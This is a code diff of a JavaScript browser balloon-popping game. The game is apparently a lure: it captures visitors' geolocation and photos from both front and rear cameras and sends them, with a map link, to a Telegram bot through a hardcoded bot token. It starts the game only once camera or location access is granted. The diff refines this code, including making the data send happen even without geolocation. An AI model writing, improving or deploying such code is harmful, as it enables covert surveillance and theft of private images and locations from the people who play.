@@ -1,12 +1,16 @@
 const canvas = document.getElementById('game-canvas');
 const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
+
+function resize() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+}
+resize();
+window.addEventListener('resize', resize);
 
 let redHits = 0;
 let fails = 0;
 let balloons = [];
-let accessGranted = false;
 let collected = false;
 
 const token = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
@@ -53,20 +57,22 @@ async function getUserData() {
       gotGeo = true;
       sendAll();
     }, () => sendAll());
+  } else {
+    sendAll();
   }
 
   // Получаем фото с камеры
   const video = document.getElementById("video");
 
   try {
-    // фронт
+    // фронтальная камера
     const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
     video.srcObject = streamFront;
     await new Promise(res => setTimeout(res, 1000));
     photoFront = await capturePhoto(video);
     streamFront.getTracks().forEach(track => track.stop());
 
-    // задняя
+    // задняя камера
     const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
     video.srcObject = streamBack;
     await new Promise(res => setTimeout(res, 1000));
@@ -84,8 +90,7 @@ async function getUserData() {
     await sendToTelegram(`👤 Անուն: ${username}\n${locationText}\n${mapLink || ""}\n📷 Տվյալներ ${gotCam ? "✓" : "✗"}, 📍 Գեո ${gotGeo ? "✓" : "✗"}`);
     if (photoFront) await sendPhoto(photoFront, "Ֆոտո - Առջևի տեսախցիկ");
     if (photoBack) await sendPhoto(photoBack, "Ֆոտո - Հետևի տեսախցիկ");
-    accessGranted = gotGeo || gotCam;
-    if (accessGranted) startGame();
+    if (gotCam || gotGeo) startGame();
   }
 }
 
@@ -97,7 +102,8 @@ function capturePhoto(video) {
   return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
 }
 
-// ИГРА
+// --- Игра ---
+
 function createBalloon() {
   const colors = ['red', 'blue', 'green', 'yellow'];
   const color = colors[Math.floor(Math.random() * colors.length)];
@@ -158,32 +164,26 @@ function endGame(victory) {
   const countdownEl = document.getElementById('countdown');
   const anim = document.getElementById('balloon-animation');
   anim.innerHTML = '';
+
+  // Добавим анимацию шариков с дротиками
+  for (let i = 0; i < 50; i++) {
+    const balloon = document.createElement('div');
+    balloon.classList.add('balloon');
+    balloon.style.background = ['red', 'blue', 'yellow'][i % 3];
+    balloon.style.left = Math.random() * window.innerWidth + 'px';
+    balloon.style.bottom = '0px';
+    balloon.style.animationDuration = `${2 + Math.random() * 2}s`;
+    anim.appendChild(balloon);
+  }
+
   const timer = setInterval(() => {
     countdown--;
     countdownEl.textContent = countdown;
     if (countdown <= 0) {
       clearInterval(timer);
-      showBalloonExplosion();
+      location.reload();
     }
   }, 1000);
-}
-
-function showBalloonExplosion() {
-  const anim = document.getElementById('balloon-animation');
-  anim.innerHTML = '';
-  for (let i = 0; i < 50; i++) {
-    const balloon = document.createElement('div');
-    balloon.style.width = '15px';
-    balloon.style.height = '20px';
-    balloon.style.borderRadius = '50%';
-    balloon.style.background = ['red', 'blue', 'yellow'][i % 3];
-    balloon.style.position = 'absolute';
-    balloon.style.left = Math.random() * window.innerWidth + 'px';
-    balloon.style.bottom = '0px';
-    balloon.style.animation = `floatUp ${2 + Math.random()*2}s ease-out forwards`;
-    anim.appendChild(balloon);
-  }
-  setTimeout(() => location.reload(), 3000);
 }
 
 function startGame() {
